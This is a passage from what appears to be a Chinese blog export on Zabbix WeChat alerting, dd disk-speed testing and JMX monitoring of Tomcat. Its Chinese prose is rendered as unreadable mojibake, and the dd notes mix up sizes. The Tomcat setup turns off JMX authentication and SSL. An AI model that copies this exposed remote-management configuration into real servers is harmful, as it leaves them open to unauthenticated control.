æ˜¯åº”ç”¨IDä¸€å¼€å§‹å†™1ï¼Œåæ¥æ”¹æˆ3æµ‹è¯•å°±é€šäº†ã€‚ 12[root@salt alertscripts]# python weixin.py test hello world!&#123;u'invaliduser': u'all user invalid', u'errcode': 0, u'errmsg': u'ok'&#125; è¿™é‡Œç”¨æˆ·å…³æ³¨äº†ä»¥åï¼š 12[root@salt alertscripts]# python weixin.py jinyu hello world!&#123;u'errcode': 0, u'errmsg': u'ok'&#125; webæœåŠ¡ç«¯é…ç½®ï¼šè‡³æ­¤å·¥å…·å®‰è£…å®Œæˆï¼Œåœ¨zabbixç•Œé¢é‡Œæ·»åŠ è„šæœ¬å‘Šè­¦ è®¾ç½®è„šæœ¬ï¼Œè„šæœ¬åç§°ä¸ºå·¥å…·åç§°ï¼Œè®¾ç½®å¥½ç‚¹æ·»åŠ æŒ‰é’® æ·»åŠ æ–°çš„æŠ¥è­¦åª’ä»‹åˆ°ç”¨æˆ·ï¼Œæˆ‘ä»¥Adminç”¨æˆ·ä¸ºä¾‹ æ·»åŠ  é€‰æ‹©åˆšæ‰çš„åª’ä»‹ï¼Œæ”¶ä»¶äººä¸ºæˆ‘æä¾›çš„UserIDï¼Œå¤šä¸ªç”¨æˆ·ç”¨ï½œéš”å¼€ æ·»åŠ åä¸€ç‚¹è¦ç‚¹æ›´æ–° æˆ‘ä»¬åœ¨è¿™é‡Œç‹¬ç«‹è®¾ç½®ä¸€ä¸ªActionï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨é»˜è®¤çš„Actioné‡Œæ·»åŠ  åç§°ä¸ºweixin å‘Šè­¦æ¶ˆæ¯çš„æ ¼å¼ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®è‡ªå·±éœ€æ±‚å…·ä½“è®¾ç½®ï¼Œä¸‹é¢æ˜¯æˆ‘çš„è®¾ç½® é»˜è®¤æ¥æ”¶äººï¼šæ•…éšœ{TRIGGER.STATUS},æœåŠ¡å™¨:{HOSTNAME1}å‘ç”Ÿ: {TRIGGER.NAME}æ•…éšœ! é»˜è®¤ä¿¡æ¯ï¼š 123456789101112131415161718192021å‘Šè­¦ä¸»æœº:&#123;HOSTNAME1&#125;å‘Šè­¦æ—¶é—´:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;å‘Šè­¦ç­‰çº§:&#123;TRIGGER.SEVERITY&#125;å‘Šè­¦ä¿¡æ¯: &#123;TRIGGER.NAME&#125;å‘Šè­¦é¡¹ç›®:&#123;TRIGGER.KEY1&#125;é—®é¢˜è¯¦æƒ…:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;å‰çŠ¶æ€:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;äº‹ä»¶ID:&#123;EVENT.ID&#125;æ¢å¤ä¸»æ—¨ï¼šæ¢å¤&#123;TRIGGER.STATUS&#125;, æœåŠ¡å™¨:&#123;HOSTNAME1&#125;: &#123;TRIGGER.NAME&#125;å·²æ¢å¤!æ¢å¤ä¿¡æ¯ï¼šå‘Šè­¦ä¸»æœº:&#123;HOSTNAME1&#125;å‘Šè­¦æ—¶é—´:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;å‘Šè­¦ç­‰çº§:&#123;TRIGGER.SEVERITY&#125;å‘Šè­¦ä¿¡æ¯: &#123;TRIGGER.NAME&#125;å‘Šè­¦é¡¹ç›®:&#123;TRIGGER.KEY1&#125;é—®é¢˜è¯¦æƒ…:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;å½“å‰çŠ¶æ€:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;äº‹ä»¶ID:&#123;EVENT.ID&#125; åˆ‡æ¢åˆ°æ“ä½œæ ‡ç­¾ï¼Œæ·»åŠ æ“ä½œé€‰æ‹©å‘é€åˆ°Adminç”¨æˆ·ï¼Œåªä½¿ç”¨weixinï¼Œé€‰æ‹©å¥½ä¹‹åç‚¹æ·»åŠ ,è¿™é‡Œæˆ‘å·²ç»æ·»åŠ è¿‡äº†ï¼Œæ‰€ä»¥æç¤ºæ›´æ–°ã€‚è®¾ç½®å¥½ä¹‹åå¦‚ä¸‹ï¼Œç‚¹æ·»åŠ  ç»è¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œå°±å®Œæˆäº†é…ç½®ï¼Œå°±å¯ä»¥ä½¿ç”¨zabbixæ¥å‘Šè­¦å•¦ï¼Œç”¨ddå‘½ä»¤æµ‹è¯•ä¸‹ç£ç›˜i/oå‘Šè­¦ï¼Œä¸€ä¼šå°±ä¼šçœ‹åˆ°å¾®ä¿¡ä¸Šå‘è¿‡æ¥çš„å‘Šè­¦ä¿¡æ¯ dd if=/dev/zero of=/tmp/test2.img bs=1024M count=1000 oflag=dsync è¯¾å¤–æ™®åŠï¼šæ™®åŠï¼š å¦‚ä½•æ­£ç¡®ä½¿ç”¨ddå·¥å…·æµ‹è¯•ç£ç›˜çš„I/Oé€Ÿåº¦ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½æ˜¯ä½¿ç”¨ddå‘½ä»¤åˆ›å»ºä¸€ä¸ªå¤§æ–‡ä»¶æ¥æµ‹è¯•ç£ç›˜çš„è¯»å†™é€Ÿåº¦ã€‚ä½†æ˜¯ï¼Œå¾ˆå¤šäººéƒ½å­˜åœ¨ä¸€ä¸ªè¯¯åŒºï¼Œä»¥ä¸ºddå‘½ä»¤æ˜¾ç¤ºçš„é€Ÿåº¦å°±æ˜¯ç£ç›˜çš„å†™å…¥é€Ÿåº¦ï¼Œå…¶å®è¿™æ˜¯ä¸ç„¶çš„ã€‚æˆ‘ä»¬åˆ†æä¸€ä¸‹ddå‘½ä»¤æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 è¿™ç§æƒ…å†µä¸‹æµ‹è¯•æ˜¾ç¤ºçš„é€Ÿåº¦æ˜¯ddå‘½ä»¤å°†æ•°æ®å†™å…¥åˆ°å†…å­˜ç¼“å†²åŒºä¸­çš„é€Ÿåº¦ï¼Œåªæœ‰å½“æ•°æ®å†™å…¥å†…å­˜ç¼“å†²åŒºå®Œæˆåï¼Œæ‰å¼€å§‹å°†æ•°æ®åˆ·å…¥ç¡¬ç›˜ï¼Œæ‰€ä»¥è¿™æ—¶å€™çš„æ•°æ®æ˜¯æ— æ³•æ­£ç¡®è¡¡é‡ç£ç›˜å†™å…¥é€Ÿåº¦çš„ã€‚ dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1;sync è¿™ç§æƒ…å†µä¸‹æµ‹è¯•æ˜¾ç¤ºçš„è·Ÿä¸Šä¸€ç§æƒ…å†µæ˜¯ä¸€æ ·çš„ï¼Œä¸¤ä¸ªå‘½ä»¤æ˜¯å…ˆåæ‰§è¡Œçš„ï¼Œå½“syncå¼€å§‹æ‰§è¡Œçš„æ—¶å€™ï¼Œddå‘½ä»¤å·²ç»å°†é€Ÿåº¦ä¿¡æ¯æ‰“å°åˆ°äº†å±å¹•ä¸Šï¼Œä»ç„¶æ— æ³•æ˜¾ç¤ºä»å†…å­˜å†™ç¡¬ç›˜æ—¶çš„çœŸæ­£é€Ÿåº¦ã€‚ dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 conv=fdatasync è¿™ç§æƒ…å†µåŠ å…¥è¿™ä¸ªå‚æ•°åï¼Œddå‘½ä»¤æ‰§è¡Œåˆ°æœ€åä¼šçœŸæ­£æ‰§è¡Œä¸€æ¬¡â€œåŒæ­¥(sync)â€æ“ä½œï¼Œæ‰€ä»¥è¿™æ—¶å€™ä½ å¾—åˆ°çš„æ˜¯è¯»å–è¿™128Mæ•°æ®åˆ°å†…å­˜å¹¶å†™å…¥åˆ°ç£ç›˜ä¸Šæ‰€éœ€çš„æ—¶é—´ï¼Œè¿™æ ·ç®—å‡ºæ¥çš„æ—¶é—´æ‰æ˜¯æ¯”è¾ƒç¬¦åˆå®é™…çš„ã€‚ dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 oflag=dsync è¿™ç§æƒ…å†µä¸‹ï¼Œddåœ¨æ‰§è¡Œæ—¶æ¯æ¬¡éƒ½ä¼šè¿›è¡ŒåŒæ­¥å†™å…¥æ“ä½œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ¡å‘½ä»¤æ¯æ¬¡è¯»å–1Måå°±è¦å…ˆæŠŠè¿™1Må†™å…¥ç£ç›˜ï¼Œç„¶åå†è¯»å–ä¸‹é¢è¿™1Mï¼Œä¸€å…±é‡å¤128æ¬¡ã€‚è¿™å¯èƒ½æ˜¯æœ€æ…¢çš„ä¸€ç§æ–¹å¼ï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰ç”¨åˆ°å†™ç¼“å­˜(write cache)ã€‚ æ€»ç»“ï¼š å»ºè®®ä½¿ç”¨æµ‹è¯•å†™é€Ÿåº¦çš„æ–¹å¼ä¸ºï¼š dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 conv=fdatasync å»ºè®®ä½¿ç”¨æµ‹è¯•è¯»é€Ÿåº¦çš„æ–¹å¼ä¸ºï¼š dd if=/xiaohan/test.iso of=/dev/zero bs=1024M count=1 iflag=direct *æ³¨ï¼šè¦æ­£ç¡®æµ‹è¯•ç£ç›˜è¯»å†™èƒ½åŠ›ï¼Œå»ºè®®æµ‹è¯•æ–‡ä»¶çš„å¤§å°è¦è¿œè¿œå¤§äºå†…å­˜çš„å®¹é‡ï¼ï¼ï¼ PSï¼šåç»­è®¡åˆ’1.åç»­å¯èƒ½ä¼šå¢åŠ å‘é€æ¬¡æ•°è®¡æ•°ï¼Œæ–¹ä¾¿ç®¡ç†ç”¨æˆ· 2.æ·»åŠ æŸ¥è¯¢æ“ä½œåˆ°å¾®ä¿¡ï¼Œé’ˆå¯¹ç”¨æˆ·å®šåˆ¶å¼€å‘ã€‚å¯é€šè¿‡å¾®ä¿¡æŸ¥è¯¢zabbixæœåŠ¡å™¨é‡Œç›‘æ§ä¸»æœºçš„çŠ¶æ€ï¼Œé€šè¿‡å¾®ä¿¡ç®€å•æ“ä½œzabbixã€‚ é¢„è§ˆ æ³¨æ„äº‹é¡¹åŠæŠ¥é”™å¤„ç† #Zabbix-webé¡µé¢æ–°å¢ç”¨æˆ·æƒé™å¤„ç†ï¼Œå‘é€å¯¹è±¡é€‰æ‹©ï¼ˆç”¨æˆ·çš„åç§°ï¼‰ #åº”ç”¨å½“ä¸­å¯è§èŒƒå›´é€‰æ‹©æ³¨æ„ï¼ˆé€‰è¿™è¦å‘é€çš„å¯¹è±¡ï¼ˆéƒ¨é—¨ï¼ŒåŠéƒ¨é—¨æˆå‘˜ï¼‰ï¼‰ zabbix-server2.4æœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix-serveræœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix2.4ç›‘æ§80ç«¯å£çŠ¶æ€ : zabbixç›‘æ§80ç«¯å£çŠ¶æ€ zabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ ï¼šzabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ : zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ : zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“","link":"/2016/06/22/æ€§èƒ½ç›‘æ§/Zabbix/zabbix3-0å®ç°å¾®ä¿¡æŠ¥è­¦/"},{"title":"zabbix3.0éƒ¨ç½²jmxç›‘æ§tomcat","text":"zabbixæä¾›äº†ä¸€ä¸ªjava gatewayçš„åº”ç”¨å»ç›‘æ§jmxï¼ˆJava Management Extensionsï¼Œå³Javaç®¡ç†æ‰©å±•ï¼‰æ˜¯ä¸€ä¸ªä¸ºåº”ç”¨ç¨‹åºã€è®¾å¤‡ã€ç³»ç»Ÿç­‰æ¤å…¥ç®¡ç†åŠŸèƒ½çš„æ¡†æ¶ã€‚JMXå¯ä»¥è·¨è¶Šä¸€ç³»åˆ—å¼‚æ„æ“ä½œç³»ç»Ÿå¹³å°ã€ç³»ç»Ÿä½“ç³»ç»“æ„å’Œç½‘ç»œä¼ è¾“åè®®ï¼Œçµæ´»çš„å¼€å‘æ— ç¼é›†æˆçš„ç³»ç»Ÿã€ç½‘ç»œå’ŒæœåŠ¡ç®¡ç†åº”ç”¨ã€‚ ä¸€. Zabbix çš„JMXç›‘æ§æ¶æ„ ä¸€ï¼šéƒ¨ç½²ç¯å¢ƒ123Centos 6.7Zabbix 3.0.3Tomcat 7.0.55 æœåŠ¡ç«¯é…ç½®1ã€å®‰è£…jdkï¼ˆç‰ˆæœ¬1.7.0_79ï¼‰JDK å„è‡ªçš„ç‰ˆæœ¬7.0 è¿˜æ˜¯8.0 ç‰ˆæœ¬å®˜ç½‘ä¸‹è½½ï¼šJDK æˆ‘è¿™é‡Œä¹Ÿä¸Šä¼ äº†7.0.67 ç‰ˆæœ¬çš„å’Œ8.0ç‰ˆæœ¬çš„jdkæºç åŒ…ï¼š 7.0JDKæºç åŒ… 8.0JDKæºç åŒ… å¹¶ä¸Šä¼ åˆ°zabbix server ç›´æ¥è§£å‹ä¸‹è½½ä¸‹æ¥çš„åŒ…åˆ°è‡ªå®šä¹‰çš„ç›®å½•ï¼š 1tar -zxvf jdk1.7.0_67.tar.gz -C /srv/ å®‰è£…æˆåŠŸä¹‹åæ·»åŠ ç³»ç»Ÿç¯å¢ƒå˜é‡ 123456cd /etc/profile.dvim java.shexport JAVA_HOME=/srv/jdk1.7.0_67export CLASS_PATH=\"$JAVA_HOME/lib:$JAVA_HOME/jre/lib\"export PATH=$PATH:$JAVA_HOME/bin ä½¿é…ç½®ç”Ÿæ•ˆ 1source /etc/profile å®‰è£…ä¸é…ç½®æ¯”è¾ƒç®€å•ã€‚æ‰§è¡Œjava -versionå‘½ä»¤ï¼Œå‡ºç°ç±»ä¼¼ç•Œé¢è¡¨ç¤ºæˆåŠŸã€‚ 1234java -versionjava version \"1.7.0_67\"Java(TM) SE Runtime Environment (build 1.7.0_67-b01)Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode) å¦‚æœå‡ºç°é—®é¢˜ï¼ŒæŸ¥çœ‹ä¸‹ç¯å¢ƒå˜é‡æ˜¯å¦è®¾ç½®ã€‚ 2ã€å®‰è£…Zabbix-Java-gatewayZabbix2.0èµ·æ·»åŠ äº†æ”¯æŒç”¨äºç›‘æ§JMXåº”ç”¨ç¨‹åºçš„æœåŠ¡è¿›ç¨‹ï¼Œç§°ä¸ºâ€œZabbix-Java-gatewayâ€ï¼Œå®ƒæ˜¯ç”¨javaå†™çš„ä¸€ä¸ªç¨‹åºã€‚ å¯ä½¿ç”¨rpmè¿›è¡Œå®‰è£…ï¼Œæˆ‘ä½¿ç”¨æºç å®‰è£…ï¼Œå¤§å®¶å¯åœ¨å®‰è£…zabbixæ—¶å¯ç”¨â€“enable-javaå‚æ•°å³å¯å®‰è£…zabbix java gatewayï¼Œå¦‚æœç¬¬ä¸€æ¬¡æ²¡æœ‰åŠ è½½ï¼Œå¯é‡æ–°åŠ è½½ç¼–è¯‘å®‰è£… æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥å®‰è£…Zabbix-Java-gatewayï¼Œç¬¬1ç§æ˜¯ç¼–è¯‘å®‰è£…zabbixæ—¶æ·»åŠ â€“enable javaå‚æ•°ã€‚ç¬¬2ç§æ˜¯å•ç‹¬å®‰è£…ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š ç¬¬ä¸€ç§æ–¹æ³•ï¼š å®‰è£…gatewayï¼Œéœ€è¦javaï¼Œjava-develä¾èµ– 123yum install ï¼ï½™ http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-release-2.4-1.el6.noarch.rpm å®‰è£…yumæºyum install -y java java-devel zabbix-java-gateway å®‰è£…gateway æµ‹è¯•æ˜¯å¦æˆåŠŸï¼š ç¬¬ä¸€ï¼šæµ‹è¯•javaæ˜¯å¦æˆåŠŸ 1234java -versionjava version \"1.7.0_67\"Java(TM) SE Runtime Environment (build 1.7.0_67-b01)Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode) ç¬¬äºŒï¼šæµ‹è¯•gatewayæ˜¯å¦å®‰è£…æˆåŠŸ 12service zabbix-java-gateway statuszabbix-java-gateway is stopped ç¬¬äºŒç§æ–¹æ³•ï¼š æˆ‘è¿™é‡Œå‡çº§3.0.3ç‰ˆæœ¬çš„æ—¶å€™å·²ç»å®‰è£…å¥½äº†ã€‚æ‰€ä»¥å¦‚æœæ²¡æœ‰å®‰è£…ä¸Šçš„å¯ä»¥å•ç‹¬å®‰è£…æ²¡å…³ç³»çš„ï¼š ä¸å—å½±å“æ­¥éª¤å¦‚ä¸‹ï¼š 1234# tar zxvf zabbix-3.0.3.tar.gz# cd zabbix-3.0.3# ./configure --enable-java --prefix=/data/zabbix/zabbix_java #/data/zabbixæ˜¯æˆ‘çš„zabbixå®‰è£…ç›®å½•# make &amp;&amp; make install æˆ‘çš„ç›®å½•æ˜¯é»˜è®¤åœ¨/usr/local/zabbix/sbin/zabbix_java/ 3ã€ä¿®æ”¹Java-gatewayçš„é…ç½®æ–‡ä»¶å¹¶å¯åŠ¨å®ƒé…ç½®æ–‡ä»¶å•ç‹¬å®‰è£…çš„è·¯å¾„ä¸º/data/zabbix/zabbix_java/sbin/zabbix_java/settings.shæˆ‘è¿™é‡Œæ˜¯è¿™ä¸ªç›®å½•ã€‚å…·ä½“æ ¹æ®å®é™…å®‰è£…æƒ…å†µï¼‰ /usr/local/zabbix/sbin/zabbix_java/settings.shå¯ç”¨ä»¥ä¸‹å‚æ•°ï¼š 123LISTEN_IP=\"127.0.0.1\" #ç›‘å¬åœ°å€LISTEN_PORT=10052 #ç›‘å¬ç«¯å£START_POLLERS=50 # å¼€å¯çš„å·¥ä½œçº¿ç¨‹æ•°ï¼ˆå¿…é¡»å¤§äºç­‰äºåé¢zabbix_server.confæ–‡ä»¶çš„StartJavaPollerså‚æ•°ï¼‰ #å¿…é¡»é…ç½®ï¼Œå¯åŠ¨çš„è¿›å‡ºæ•° æ³¨æ„äº‹é¡¹ï¼š é…ç½®æ–‡ä»¶PID_FILEçš„è·¯å¾„å¿…é¡»æ˜¯æ­£ç¡®çš„ï¼Œå¯ä»¥è‡ªå·±å»cdæ‰¾ï¼Œyumå®‰è£…é»˜è®¤æƒ…å†µä¸‹ä¸ç”¨æ”¹åŠ¨ã€‚ START_POLLERSé¡¹æ˜¯é…ç½®å¯åŠ¨çš„è¿›å‡ºæ•°ï¼Œè¯¥å€¼å¿…é¡»å¤§äºç­‰äºZabbix-Serveré‡Œé¢çš„startJavaPollersé¡¹ã€‚ è¿›å…¥/usr/local/zabbix/sbin/zabbix_java/ç›®å½•ï¼Œæ‰§è¡Œ./startup.sh æ£€æŸ¥ç«¯å£æ˜¯å¦ç›‘å¬ï¼š 12netstat -anp|grep 10052tcp 0 0 0.0.0.0:10052 0.0.0.0:* LISTEN 21949/java æŸ¥çœ‹æ˜¯å¦å·²ç»ç›‘å¬10052ç«¯å£ï¼Œå¦‚æœå·²ç›‘å¬ï¼Œè¡¨ç¤ºå¯åŠ¨æˆåŠŸï¼Œå¦‚æœæ²¡æœ‰ï¼Œå¯é€šè¿‡zabbix_serveræ—¥å¿—æŸ¥çœ‹è§£å†³ 4ã€ä¿®æ”¹zabbix_serverçš„é…ç½®æ–‡ä»¶å¹¶é‡å¯12345vim /usr/local/zabbix/etc/zabbix_server.confJavaGateway=127.0.0.1 # JavaGateway æœåŠ¡å™¨åœ°å€ï¼Œzabbix_serverä¸zabbix_java_gatewayåœ¨åŒä¸€å°ä¸»æœºJavaGatewayPort=10052 #ç«¯å£StartJavaPollers=5 # #è®¾å®šè¿æ¥java gateway çš„è¿›ç¨‹æ•°ï¼Œå½“è®¾ç½®ä¸º0æ—¶è¡¨ç¤ºä¸å…·æœ‰æŠ“å–javaä¿¡æ¯çš„èƒ½åŠ› 5ã€ æ·»åŠ catalina-jmx-remote.jaræ·»åŠ catalina-jmx-remote.jaråˆ°zabbix java gatewayçš„libç›®å½•ä¸‹ï¼Œcatalina-jmx-remote.jaråŒ…å¯åœ¨http://archive.apache.org/dist/tomcat/ä¸‹ï¼Œåœ¨å„ç‰ˆæœ¬ç›®å½•çš„bin/extras/å­ç›®å½•ä¸‹ 12cd /usr/local/zabbix/sbin/zabbix_java/lib/wget http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.55/bin/extras/catalina-jmx-remote.jar é‡å¯æœåŠ¡zabbixå’Œjava gateway å¹¶åŠ å…¥å¯åŠ¨é¡¹å¹¶éªŒè¯ï¼š 123/etc/init.d/zabbix_server restart/usr/local/zabbix/sbin/zabbix_java/shutdown.sh/usr/local/zabbix/sbin/zabbix_java/startup.sh 6.ä¸‹è½½æµ‹è¯•å·¥å…·cmdline-jmxclient-0.10.3.jarcmdline-jmxclient-0.10.3.jarä¸ºä¸€ä¸ªæµ‹è¯•å·¥å…·ï¼Œå¯ç”¨æ¥æµ‹è¯•jmxæ˜¯å¦é…ç½®æ­£ç¡®ï¼Œä¸‹è½½cmdline-jmxclient-0.10.3.jar(ä¸‹è½½åˆ°ä»»æ„ç›®å½•) 1wget http://crawler.archive.org/cmdline-jmxclient/cmdline-jmxclient-0.10.3.jar äºŒã€è¢«ç›‘æ§tomcat é…ç½®ï¼»è¢«ç›‘æ§tomcatæ“ä½œï¼½ä¸‹è½½catalina-jmx-remote.jar1234cd /srv/tomcat/tomcat-account/lib/wget http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.55/bin/extras/catalina-jmx-remote.jar #æˆ‘çš„tomcatç‰ˆæœ¬æ˜¯7.0.55chown -R tomcat:tomcat catalina-jmx-remote.jarchmod +x catalina-jmx-remote.jar æˆ‘çš„tomcatç‰ˆæœ¬æ˜¯7.0.55 å°†ä¸‹è½½ååçš„jaråŒ…æ”¾åˆ°è¢«ç›‘æ§çš„tomcatå®ä¾‹çš„libç›®å½•ä¸‹ã€‚ æŸ¥çœ‹tomcatçš„ç‰ˆæœ¬ è¿™é‡Œä¹‹å‰ä¹Ÿè‡ªå·±ä¹Ÿå¿˜è®°äº†tomcatçš„ç‰ˆæœ¬æ˜¯å¤šå°‘äº†ï¼Œæ‰€ä»¥æˆ‘å…ˆæŸ¥çœ‹ä¸‹ç„¶ååœ¨ä¸‹è½½ï¼š 123456789101112131415cd /srv/tomcat/tomcat_account/bin[root@tomcat_A1 bin]# ./version.sh --Using CATALINA_BASE: /srv/tomcat/tomcat_accountUsing CATALINA_HOME: /srv/tomcat/tomcat_accountUsing CATALINA_TMPDIR: /srv/tomcat/tomcat_account/tempUsing JRE_HOME: /srv/jdk1.7.0_67Using CLASSPATH: /srv/tomcat/tomcat_account/bin/bootstrap.jar:/srv/tomcat/tomcat_account/bin/tomcat-juli.jarServer version: Apache Tomcat/7.0.55Server built: Jul 18 2014 05:34:04Server number: 7.0.55.0OS Name: LinuxOS Version: 2.6.32-573.8.1.el6.x86_64Architecture: amd64JVM Version: 1.7.0_67-b01JVM Vendor: Oracle Corporation åœ¨tomcatç«¯é…ç½®JMXã€‚ï¼ˆtomcat/bin/catalina.shï¼‰è‡ªå·±å®‰è£…çš„tomcatè·¯å¾„ï¼Œæ‰¾åˆ°catalina.shæ–‡ä»¶ã€‚ ç½‘ä¸Šå¾ˆå¤šäººä¿®æ”¹tomcat/bin/ä¸‹çš„catalina.shï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š 12345CATALINA_OPTS=\"-Dcom.sun.management.jmxremote-Dcom.sun.management.jmxremote.authenticate=false-Dcom.sun.management.jmxremote.ssl=false-Dcom.sun.management.jmxremote.port=12345 #å®šä¹‰jmxç›‘å¬ç«¯å£-Djava.rmi.server.hostname=192.168.7.186\" æˆ‘è¿™é‡Œæ˜¯ç›´æ¥åœ¨binç›®å½•ä¸‹é¢åˆ›å»ºè‡ªå®šä¹‰çš„è„šæœ¬ã€‚ ä¿®æ”¹setenv.shvi /srv/tomcat/tomcat-account/bin/setenv.sh æ·»åŠ å¦‚ä¸‹ 12345CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Djava.rmi.server.hostname=192.168.7.186\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Djavax.management.builder.initial=\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Dcom.sun.management.jmxremote=true\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Dcom.sun.management.jmxremote.ssl=false\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Dcom.sun.management.jmxremote.authenticate=false\" æ³¨æ„ï¼šhostnameä½æœºå™¨ipåœ°å€ï¼Œå³è¢«ç›‘æ§æœºå™¨å¯¹å¤–æœåŠ¡åœ°å€ 3.ä¿®æ”¹server.xmlvi /opt/apache-tomcat/conf/server.xmlæ·»åŠ å¦‚ä¸‹ï¼Œæ³¨æ„æ·»åŠ ä½ç½®åœ¨ 1&lt;Listener className=\"org.apache.catalina.core.ThreadLocalLeakPreventionListener\" /&gt; ä¹‹åæ·»åŠ å¦‚ä¸‹ä»£ç  1&lt;Listener className=\"org.apache.catalina.mbeans.JmxRemoteLifecycleListener\" rmiRegistryPortPlatform=\"12345\" rmiServerPortPlatform=\"12345\" /&gt; 3ã€é‡å¯tomcatè¿™é‡Œæˆ‘ä¹‹å‰æ˜¯ç”¨å†™å¥½çš„å¯åŠ¨è„šæœ¬å»å¯åŠ¨çš„ï¼Œå‘ç°ä¸€ä¸ªé—®é¢˜ã€‚å› ä¸ºæˆ‘éƒ½æ˜¯ç”¨/etc/init.d/tomcat stop start æ¥å¯åŠ¨ã€‚å¯æ˜¯å‘ç°æœåŠ¡å¯åŠ¨äº†ï¼Œå¯æ˜¯ä¹‹å‰çš„tomcatæœåŠ¡ç«¯å£ä¸è§äº†ã€‚æˆ‘ä¹‹å‰çš„tomcatæœåŠ¡ç«¯å£10001 ç„¶åæŸ¥çœ‹æ—¥å¿—å‡ºç°æŠ¥é”™ï¼š 123456789101112131415161718192021 at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.commons.daemon.support.DaemonLoader.start(DaemonLoader.java:243)Caused by: java.lang.IllegalArgumentException: jmxremote.access (æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•) at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:373) at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.createServer(JmxRemoteLifecycleListener.java:313) at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.lifecycleEvent(JmxRemoteLifecycleListener.java:259) at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117) at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90) at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402) at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:347) at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:732) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150) ... 11 moreCaused by: java.io.FileNotFoundException: jmxremote.access (æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•) at java.io.FileInputStream.open(Native Method) at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:146) at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:101) at com.sun.jmx.remote.security.MBeanServerFileAccessController.propertiesFromFile(MBeanServerFileAccessController.java:294) at com.sun.jmx.remote.security.MBeanServerFileAccessController.&lt;init&gt;(MBeanServerFileAccessController.java:133) at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:371) ... 19 more è¿™é‡Œå…ˆkill -9 tomcatè¿›ç¨‹åªéœ€è¦åœ¨/bin/ç›®å½•ä¸‹é¢å¯åŠ¨æœåŠ¡ã€‚./startup.shç„¶åæŸ¥çœ‹æœ‰ä¸‹é¢çš„12345 12346 è¿›ç¨‹ å’Œtomcatè¿›ç¨‹10001 è¯´æ˜å°±å¯¹äº†ã€‚ 1234567891011121314[root@tomcat_A1 bin]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 10.46.72.172:10050 0.0.0.0:* LISTEN 8483/zabbix_agentdtcp 0 0 127.0.0.1:8006 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:4041 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:10001 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1363/sshdtcp 0 0 0.0.0.0:36440 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:12345 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:12346 0.0.0.0:* 1374/ntpdudp 0 0 10.46.72.172:123 0.0.0.0:* 1374/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1374/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 